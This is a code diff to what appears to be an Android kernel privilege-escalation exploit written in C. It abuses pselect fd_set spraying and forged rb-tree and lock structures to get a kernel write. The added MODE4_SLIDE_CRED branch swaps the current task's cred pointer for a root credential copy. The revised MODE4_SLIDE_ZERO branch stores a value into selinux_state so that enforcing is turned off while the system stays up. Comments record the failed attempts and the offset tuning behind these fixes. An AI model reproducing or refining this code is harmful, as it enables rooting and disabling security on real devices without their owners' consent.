@@ -823,7 +823,7 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
           pi_parent = 0;
           pi_right = 0;
           pi_left = (uint64_t)pselect_write_target();
-          stack_task = (uint64_t)text_addr(KIMAGE_TEXT_BASE +
+          stack_task = (uint64_t)data_addr(KIMAGE_TEXT_BASE +
               (active_offsets ? active_offsets->off_init_task
                               : INIT_TASK_OFF));
           stack_lock = fake_lock;
@@ -871,28 +871,71 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
                     "right=0 left=%016llx (*(fake_fops+0x90)=fake_fops+0x80)\n",
                     (unsigned long long)tree_pc,
                     (unsigned long long)tree_l);
-          } else if (env_flag("MODE4_SLIDE_ZERO", 0)) {
+          } else if (env_flag("MODE4_SLIDE_CRED", 0)) {
             /*
-             * SLIDE_ZERO / JoinChang W1 / emerald NULL:
-             * Leaf under parent=target-8 (red). __rb_change_child's
-             * else branch writes NULL into parent->rb_right == *target.
-             * tree_pc=0 + left=target (old) set lock.waiters=target → KP
-             * (Z2/Z3). Color red so rb_erase_color is skipped.
+             * Z6 used VALUE=P0(init_cred). only-left __rb_change_child
+             * then wrote the cred_slot pointer into init_cred+8/+16 and
+             * the framework died (unknown SID / zygote gone). VALUE is
+             * the sprayed cred copy instead: smash stays on our page.
+             *   parent_color = VALUE = cred_copy (red)
+             *   left         = TARGET = task.cred slot
+             *   right        = 0
+             * → *task.cred = cred_copy (uid=0, huge usage).
              */
             {
               uint64_t ztgt = (uint64_t)pselect_write_target();
-              tree_pc = (ztgt - 8) & ~1ULL;
+              uint64_t copy = (uint64_t)g_cred_copy & ~1ULL;
+              uint64_t it_off =
+                  (active_offsets && active_offsets->off_init_task)
+                      ? (uint64_t)active_offsets->off_init_task
+                      : (uint64_t)INIT_TASK_OFF;
+              tree_pc = copy;
               tree_r = 0;
-              tree_l = 0;
+              tree_l = ztgt;
               pi_parent = 0;
               pi_right = 0;
               pi_left = 0;
-              stack_lock = fake_lock;
+              stack_task = data_addr(KIMAGE_TEXT_BASE + it_off);
+              stack_lock = data_addr(KIMAGE_TEXT_BASE + it_off + 0x878ULL);
               stack_prio = 3;
               stack_deadline = 0;
-              pr_info("stack mode4 SLIDE_ZERO: parent=%016llx-8 leaf "
-                      "→ *%016llx = 0\n",
-                      (unsigned long long)ztgt, (unsigned long long)ztgt);
+              pr_info("stack mode4 SLIDE_CRED: *%016llx = cred_copy "
+                      "%016llx (BSS lock, not init_cred)\n",
+                      (unsigned long long)ztgt, (unsigned long long)copy);
+            }
+          } else if (env_flag("MODE4_SLIDE_ZERO", 0)) {
+            /*
+             * W1 selinux_state PLAIN-STORE (not 8-byte NULL).
+             * 0x02A793C8 is &selinux_state (kallsyms). 5.10 packed bools:
+             *   +0 disabled +1 enforcing +2 checkreqprot +3 initialized
+             * Z4/Z14 leaf NULL zeroed the whole qword → initialized=0 →
+             * SID-to-context fails → ~100s later OplusCfThread SIGKILLs
+             * system_server. UMASK/F27 shape: *state = P0(0x02BB0000)
+             * (LE 00 00 bb 2a …) so enforcing=0 and initialized≠0.
+             * change_child stores into BSS scratch at value+8, not .data.
+             * Overlay lock/task stay init_task BSS (Z14 select lived).
+             */
+            {
+              uint64_t ztgt = (uint64_t)pselect_write_target();
+              uint64_t it_off =
+                  (active_offsets && active_offsets->off_init_task)
+                      ? (uint64_t)active_offsets->off_init_task
+                      : (uint64_t)INIT_TASK_OFF;
+              uint64_t plain = (uint64_t)data_addr(KIMAGE_TEXT_BASE +
+                                                   0x02BB0000ULL);
+              tree_pc = plain & ~1ULL; /* red */
+              tree_r = 0;
+              tree_l = ztgt;
+              pi_parent = 0;
+              pi_right = 0;
+              pi_left = 0;
+              stack_task = data_addr(KIMAGE_TEXT_BASE + it_off);
+              stack_lock = data_addr(KIMAGE_TEXT_BASE + it_off + 0x878ULL);
+              stack_prio = 3;
+              stack_deadline = 0;
+              pr_info("stack mode4 SLIDE_ZERO PLAIN-STORE *state=%016llx "
+                      "val=%016llx (enf=0 init≠0) lock=init_task+0x878\n",
+                      (unsigned long long)ztgt, (unsigned long long)plain);
             }
           } else if (env_flag("MODE4_SLIDE_SWAP", 0)) {
             /*
@@ -1486,14 +1529,8 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
                    ? (uint64_t)pselect_write_target()
                    : 0,
            "pi_left"},
-          {6, env_flag("MODE4_DATAONLY", 0)
-                   ? (uint64_t)text_addr(KIMAGE_TEXT_BASE +
-                         (active_offsets ? active_offsets->off_init_task
-                                         : INIT_TASK_OFF))
-                   : (pselect_custom_write_enabled() ? fake_task
-                                                    : text_addr(INIT_TASK)),
-           "task"},
-          {7, fake_lock, "lock"},
+          {6, stack_task, "task"},
+          {7, stack_lock, "lock"},
           {8, 0, "prio"},
           {9, 0, "deadline"},
         };
